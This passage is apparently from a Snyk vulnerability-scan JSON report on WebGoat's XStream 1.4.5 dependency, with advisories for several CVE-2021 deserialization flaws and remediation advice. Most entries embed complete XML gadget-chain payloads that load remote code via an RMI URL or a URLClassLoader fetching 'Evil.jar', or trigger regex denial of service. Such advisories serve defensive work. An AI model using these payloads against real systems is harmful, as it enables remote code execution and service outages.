      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. There is a vulnerability which may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream.\r\n\r\n### PoC\r\n```\r\n<java.util.PriorityQueue serialization='custom'>\r\n  <unserializable-parents/>\r\n  <java.util.PriorityQueue>\r\n    <default>\r\n      <size>2</size>\r\n      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>\r\n        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>\r\n          <packet>\r\n            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>\r\n              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>\r\n                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>\r\n                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>\r\n                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>\r\n                      <jaxbType>com.sun.rowset.JdbcRowSetImpl</jaxbType>\r\n                      <uriProperties/>\r\n                      <attributeProperties/>\r\n                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>\r\n                        <getter>\r\n                          <class>com.sun.rowset.JdbcRowSetImpl</class>\r\n                          <name>getDatabaseMetaData</name>\r\n                          <parameter-types/>\r\n                        </getter>\r\n                      </inheritedAttWildcard>\r\n                    </bi>\r\n                    <tagName/>\r\n                    <context>\r\n                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>\r\n                        <outer-class reference='../..'/>\r\n                      </marshallerPool>\r\n                      <nameList>\r\n                        <nsUriCannotBeDefaulted>\r\n                          <boolean>true</boolean>\r\n                        </nsUriCannotBeDefaulted>\r\n                        <namespaceURIs>\r\n                          <string>1</string>\r\n                        </namespaceURIs>\r\n                        <localNames>\r\n                          <string>UTF-8</string>\r\n                        </localNames>\r\n                      </nameList>\r\n                    </context>\r\n                  </bridge>\r\n                </bridge>\r\n                <jaxbObject class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>\r\n                  <javax.sql.rowset.BaseRowSet>\r\n                    <default>\r\n                      <concurrency>1008</concurrency>\r\n                      <escapeProcessing>true</escapeProcessing>\r\n                      <fetchDir>1000</fetchDir>\r\n                      <fetchSize>0</fetchSize>\r\n                      <isolation>2</isolation>\r\n                      <maxFieldSize>0</maxFieldSize>\r\n                      <maxRows>0</maxRows>\r\n                      <queryTimeout>0</queryTimeout>\r\n                      <readOnly>true</readOnly>\r\n                      <rowSetType>1004</rowSetType>\r\n                      <showDeleted>false</showDeleted>\r\n                      <dataSource>rmi://localhost:15000/CallRemoteMethod</dataSource>\r\n                      <params/>\r\n                    </default>\r\n                  </javax.sql.rowset.BaseRowSet>\r\n                  <com.sun.rowset.JdbcRowSetImpl>\r\n                    <default>\r\n                      <iMatchColumns>\r\n                        <int>-1</int>\r\n                        <int>-1</int>\r\n                        <int>-1</int>\r\n                        <int>-1</int>\r\n                        <int>-1</int>\r\n                        <int>-1</int>\r\n                        <int>-1</int>\r\n                        <int>-1</int>\r\n                        <int>-1</int>\r\n                        <int>-1</int>\r\n                      </iMatchColumns>\r\n                      <strMatchColumns>\r\n                        <string>foo</string>\r\n                        <null/>\r\n                        <null/>\r\n                        <null/>\r\n                        <null/>\r\n                        <null/>\r\n                        <null/>\r\n                        <null/>\r\n                        <null/>\r\n                        <null/>\r\n                      </strMatchColumns>\r\n                    </default>\r\n                  </com.sun.rowset.JdbcRowSetImpl>\r\n                </jaxbObject>\r\n              </dataSource>\r\n            </message>\r\n            <satellites/>\r\n            <invocationProperties/>\r\n          </packet>\r\n        </indexMap>\r\n      </comparator>\r\n    </default>\r\n    <int>3</int>\r\n    <string>javax.xml.ws.binding.attachments.inbound</string>\r\n    <string>javax.xml.ws.binding.attachments.inbound</string>\r\n  </java.util.PriorityQueue>\r\n</java.util.PriorityQueue>\r\n```\r\n\r\nUsers who follow [the recommendation](https://x-stream.github.io/security.html#workaround) to setup XStream's security framework with a whitelist limited to the minimal required types are not affected.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.16 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-21344.html)\n- [XStream Changelog](http://x-stream.github.io/changes.html#1.4.16)\n- [XStream Workaround](https://x-stream.github.io/security.html#workaround)\n",
      "disclosureTime": "2021-03-23T12:10:02Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.16"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088329",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-59jw-jqf4-3wq3"
        ],
        "CVE": [
          "CVE-2021-21344"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-03-23T17:13:21.321001Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-03-23T17:13:21.319113Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-21344.html"
        },
        {
          "title": "XStream Changelog",
          "url": "http://x-stream.github.io/changes.html%231.4.16"
        },
        {
          "title": "XStream Workaround",
          "url": "https://x-stream.github.io/security.html%23workaround"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.8,
          "severity": "critical",
          "modificationTime": "2022-02-16T16:10:18.624280Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
          "cvssV3BaseScore": 7.3,
          "severity": "high",
          "modificationTime": "2022-05-03T22:10:59.424594Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
          "cvssV3BaseScore": 7.3,
          "severity": "high",
          "modificationTime": "2022-09-01T19:37:50.741861Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.16)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.16"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-03-23T12:38:22.474553Z",
      "credit": [
        "threedr3am"
      ],
      "cvssScore": 5.3,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. There is a vulnerability which may allow a remote attacker to occupy a thread that consumes maximum CPU time and will never return. An attacker can manipulate the processed input stream and replace or inject objects, that result in executed evaluation of a malicious regular expression, causing a denial of service.\r\n\r\n### PoC\r\n```\r\n<java.util.PriorityQueue serialization='custom'>\r\n  <unserializable-parents/>\r\n  <java.util.PriorityQueue>\r\n    <default>\r\n      <size>2</size>\r\n      <comparator class='javafx.collections.ObservableList$1'/>\r\n    </default>\r\n    <int>3</int>\r\n    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\r\n      <dataHandler>\r\n        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\r\n          <contentType>text/plain</contentType>\r\n          <is class='java.io.SequenceInputStream'>\r\n            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\r\n              <iterator class='java.util.Scanner'>\r\n                <buf class='java.nio.HeapCharBuffer'>\r\n                  <mark>-1</mark>\r\n                  <position>0</position>\r\n                  <limit>0</limit>\r\n                  <capacity>1024</capacity>\r\n                  <address>0</address>\r\n                  <hb></hb>\r\n                  <offset>0</offset>\r\n                  <isReadOnly>false</isReadOnly>\r\n                </buf>\r\n                <position>0</position>\r\n                <matcher>\r\n                  <parentPattern>\r\n                    <pattern>\\p{javaWhitespace}+</pattern>\r\n                    <flags>0</flags>\r\n                  </parentPattern>\r\n                  <from>0</from>\r\n                  <to>0</to>\r\n                  <lookbehindTo>0</lookbehindTo>\r\n                  <text class='java.nio.HeapCharBuffer' reference='../../buf'/>\r\n                  <acceptMode>0</acceptMode>\r\n                  <first>-1</first>\r\n                  <last>0</last>\r\n                  <oldLast>-1</oldLast>\r\n                  <lastAppendPosition>0</lastAppendPosition>\r\n                  <locals/>\r\n                  <hitEnd>false</hitEnd>\r\n                  <requireEnd>false</requireEnd>\r\n                  <transparentBounds>true</transparentBounds>\r\n                  <anchoringBounds>false</anchoringBounds>\r\n                </matcher>\r\n                <delimPattern>\r\n                  <pattern>(x+)*y</pattern>\r\n                  <flags>0</flags>\r\n                </delimPattern>\r\n                <hasNextPosition>0</hasNextPosition>\r\n                <source class='java.io.StringReader'>\r\n                  <lock class='java.io.StringReader' reference='..'/>\r\n                  <str>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</str>\r\n                  <length>32</length>\r\n                  <next>0</next>\r\n                  <mark>0</mark>\r\n                </source>\r\n              </iterator>\r\n              <type>KEYS</type>\r\n            </e>\r\n            <in class='java.io.ByteArrayInputStream'>\r\n              <buf></buf>\r\n              <pos>0</pos>\r\n              <mark>0</mark>\r\n              <count>0</count>\r\n            </in>\r\n          </is>\r\n          <consumed>false</consumed>\r\n        </dataSource>\r\n        <transferFlavors/>\r\n      </dataHandler>\r\n      <dataLen>0</dataLen>\r\n    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\r\n    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>\r\n  </java.util.PriorityQueue>\r\n</java.util.PriorityQueue>\r\n```\r\n\r\nUsers who follow [the recommendation](https://x-stream.github.io/security.html#workaround) to setup XStream's security framework with a whitelist limited to the minimal required types are not affected.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.16 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-21348.html)\n- [XStream Changelog](http://x-stream.github.io/changes.html#1.4.16)\n- [XStream Workaround](https://x-stream.github.io/security.html#workaround)\n",
      "disclosureTime": "2021-03-23T12:31:43Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.16"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088330",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-56p8-3fh9-4cvq"
        ],
        "CVE": [
          "CVE-2021-21348"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-05-16T15:25:02.858671Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-03-23T17:13:21.767895Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-21348.html"
        },
        {
          "title": "XStream Changelog",
          "url": "http://x-stream.github.io/changes.html%231.4.16"
        },
        {
          "title": "XStream Workaround",
          "url": "https://x-stream.github.io/security.html%23workaround"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "severity": "high",
          "modificationTime": "2022-02-16T16:10:18.969403Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 5.9,
          "severity": "medium",
          "modificationTime": "2022-05-03T22:10:09.750736Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 5.9,
          "severity": "medium",
          "modificationTime": "2022-09-01T15:59:48.195564Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.16)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.16"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-03-23T12:42:18.446867Z",
      "credit": [
        "wh1t3P1g"
      ],
      "cvssScore": 9.1,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. There is a vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream.\r\n\r\n### PoC\r\n```\r\n<sorted-set>\r\n  <javax.naming.ldap.Rdn_-RdnEntry>\r\n    <type>ysomap</type>\r\n    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>\r\n      <m__DTMXRTreeFrag>\r\n        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>\r\n          <m__size>-10086</m__size>\r\n          <m__mgrDefault>\r\n            <__overrideDefaultParser>false</__overrideDefaultParser>\r\n            <m__incremental>false</m__incremental>\r\n            <m__source__location>false</m__source__location>\r\n            <m__dtms>\r\n              <null/>\r\n            </m__dtms>\r\n            <m__defaultHandler/>\r\n          </m__mgrDefault>\r\n          <m__shouldStripWS>false</m__shouldStripWS>\r\n          <m__indexing>false</m__indexing>\r\n          <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>\r\n            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>\r\n              <javax.sql.rowset.BaseRowSet>\r\n                <default>\r\n                  <concurrency>1008</concurrency>\r\n                  <escapeProcessing>true</escapeProcessing>\r\n                  <fetchDir>1000</fetchDir>\r\n                  <fetchSize>0</fetchSize>\r\n                  <isolation>2</isolation>\r\n                  <maxFieldSize>0</maxFieldSize>\r\n                  <maxRows>0</maxRows>\r\n                  <queryTimeout>0</queryTimeout>\r\n                  <readOnly>true</readOnly>\r\n                  <rowSetType>1004</rowSetType>\r\n                  <showDeleted>false</showDeleted>\r\n                  <dataSource>rmi://localhost:15000/CallRemoteMethod</dataSource>\r\n                  <listeners/>\r\n                  <params/>\r\n                </default>\r\n              </javax.sql.rowset.BaseRowSet>\r\n              <com.sun.rowset.JdbcRowSetImpl>\r\n                <default/>\r\n              </com.sun.rowset.JdbcRowSetImpl>\r\n            </fPullParserConfig>\r\n            <fConfigSetInput>\r\n              <class>com.sun.rowset.JdbcRowSetImpl</class>\r\n              <name>setAutoCommit</name>\r\n              <parameter-types>\r\n                <class>boolean</class>\r\n              </parameter-types>\r\n            </fConfigSetInput>\r\n            <fConfigParse reference='../fConfigSetInput'/>\r\n            <fParseInProgress>false</fParseInProgress>\r\n          </m__incrementalSAXSource>\r\n          <m__walker>\r\n            <nextIsRaw>false</nextIsRaw>\r\n          </m__walker>\r\n          <m__endDocumentOccured>false</m__endDocumentOccured>\r\n          <m__idAttributes/>\r\n          <m__textPendingStart>-1</m__textPendingStart>\r\n          <m__useSourceLocationProperty>false</m__useSourceLocationProperty>\r\n          <m__pastFirstElement>false</m__pastFirstElement>\r\n        </m__dtm>\r\n        <m__dtmIdentity>1</m__dtmIdentity>\r\n      </m__DTMXRTreeFrag>\r\n      <m__dtmRoot>1</m__dtmRoot>\r\n      <m__allowRelease>false</m__allowRelease>\r\n    </value>\r\n  </javax.naming.ldap.Rdn_-RdnEntry>\r\n  <javax.naming.ldap.Rdn_-RdnEntry>\r\n    <type>ysomap</type>\r\n    <value class='com.sun.org.apache.xpath.internal.objects.XString'>\r\n      <m__obj class='string'>test</m__obj>\r\n    </value>\r\n  </javax.naming.ldap.Rdn_-RdnEntry>\r\n</sorted-set>\r\n```\r\n\r\nUsers who follow [the recommendation](https://x-stream.github.io/security.html#workaround) to setup XStream's security framework with a whitelist limited to the minimal required types are not affected.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.16 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-21351.html)\n- [XStream Changelog](http://x-stream.github.io/changes.html#1.4.16)\n- [XStream Workaround](https://x-stream.github.io/security.html#workaround)\n",
      "disclosureTime": "2021-03-23T12:39:12Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.16"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088331",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-hrcp-8f3q-4w2c"
        ],
        "CVE": [
          "CVE-2021-21351"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-06-07T12:27:14.788751Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-03-23T17:13:22Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-21351.html"
        },
        {
          "title": "XStream Changelog",
          "url": "http://x-stream.github.io/changes.html%231.4.16"
        },
        {
          "title": "XStream Workaround",
          "url": "https://x-stream.github.io/security.html%23workaround"
        }
      ],
      "severity": "critical",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.1,
          "severity": "critical",
          "modificationTime": "2022-02-17T04:10:19.783701Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8,
          "severity": "high",
          "modificationTime": "2022-05-03T22:10:10.252672Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8,
          "severity": "high",
          "modificationTime": "2022-09-01T16:00:43.339617Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.16)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "critical",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.16"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:N/I:H/A:N/E:P",
      "alternativeIds": [],
      "creationTime": "2021-03-23T12:55:55.330773Z",
      "credit": [
        "threedr3am"
      ],
      "cvssScore": 6.1,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. There is a vulnerability which may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. \r\n\r\n### PoC\r\n```\r\n<java.util.PriorityQueue serialization='custom'>\r\n  <unserializable-parents/>\r\n  <java.util.PriorityQueue>\r\n    <default>\r\n      <size>2</size>\r\n      <comparator class='javafx.collections.ObservableList$1'/>\r\n    </default>\r\n    <int>3</int>\r\n    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\r\n      <dataHandler>\r\n        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\r\n          <contentType>text/plain</contentType>\r\n          <is class='java.io.SequenceInputStream'>\r\n            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\r\n              <iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'>\r\n                <names class='java.util.AbstractList$Itr'>\r\n                  <cursor>0</cursor>\r\n                  <lastRet>-1</lastRet>\r\n                  <expectedModCount>0</expectedModCount>\r\n                  <outer-class class='java.util.Arrays$ArrayList'>\r\n                    <a class='string-array'>\r\n                      <string>Evil</string>\r\n                    </a>\r\n                  </outer-class>\r\n                </names>\r\n                <processorCL class='java.net.URLClassLoader'>\r\n                  <ucp class='sun.misc.URLClassPath'>\r\n                    <urls serialization='custom'>\r\n                      <unserializable-parents/>\r\n                      <vector>\r\n                        <default>\r\n                          <capacityIncrement>0</capacityIncrement>\r\n                          <elementCount>1</elementCount>\r\n                          <elementData>\r\n                            <url>http://127.0.0.1:80/Evil.jar</url>\r\n                          </elementData>\r\n                        </default>\r\n                      </vector>\r\n                    </urls>\r\n                    <path>\r\n                      <url>http://127.0.0.1:80/Evil.jar</url>\r\n                    </path>\r\n                    <loaders/>\r\n                    <lmap/>\r\n                  </ucp>\r\n                  <package2certs class='concurrent-hash-map'/>\r\n                  <classes/>\r\n                  <defaultDomain>\r\n                    <classloader class='java.net.URLClassLoader' reference='../..'/>\r\n                    <principals/>\r\n                    <hasAllPerm>false</hasAllPerm>\r\n                    <staticPermissions>false</staticPermissions>\r\n                    <key>\r\n                      <outer-class reference='../..'/>\r\n                    </key>\r\n                  </defaultDomain>\r\n                  <initialized>true</initialized>\r\n                  <pdcache/>\r\n                </processorCL>\r\n              </iterator>\r\n              <type>KEYS</type>\r\n            </e>\r\n            <in class='java.io.ByteArrayInputStream'>\r\n              <buf></buf>\r\n              <pos>-2147483648</pos>\r\n              <mark>0</mark>\r\n              <count>0</count>\r\n            </in>\r\n          </is>\r\n          <consumed>false</consumed>\r\n        </dataSource>\r\n        <transferFlavors/>\r\n      </dataHandler>\r\n      <dataLen>0</dataLen>\r\n    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\r\n    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>\r\n  </java.util.PriorityQueue>\r\n</java.util.PriorityQueue>\r\n```\r\n\r\nUsers who follow [the recommendation](https://x-stream.github.io/security.html#workaround) to setup XStream's security framework with a whitelist limited to the minimal required types are not affected.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an 